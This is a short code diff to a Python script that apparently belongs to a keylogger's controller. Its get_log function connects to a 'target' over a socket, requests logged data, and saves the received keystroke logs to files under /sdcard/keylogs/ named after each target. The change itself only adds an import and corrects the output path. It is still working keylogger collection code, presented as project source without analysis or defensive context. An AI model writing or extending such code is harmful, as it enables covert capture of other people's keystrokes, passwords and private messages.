@@ -1,6 +1,7 @@
 import socket
 from get_local_addr import get_local_addr
 import os
+import time
 
 
 def main():
@@ -132,7 +133,7 @@ def get_log(target, PORT, intent):
         s.send(intent.encode())
         if not os.path.exists('/sdcard/keylogs/'):
             os.makedirs('/sdcard/keylogs/')
-        f = open('/sdcard/oyes_klog_' + target + '.txt', 'w')
+        f = open('/sdcard/keylogs/oyes_klog_' + target + '.txt', 'w')
         l = s.recv(1024)
         while l:
             f.write(l.decode('utf-8'))
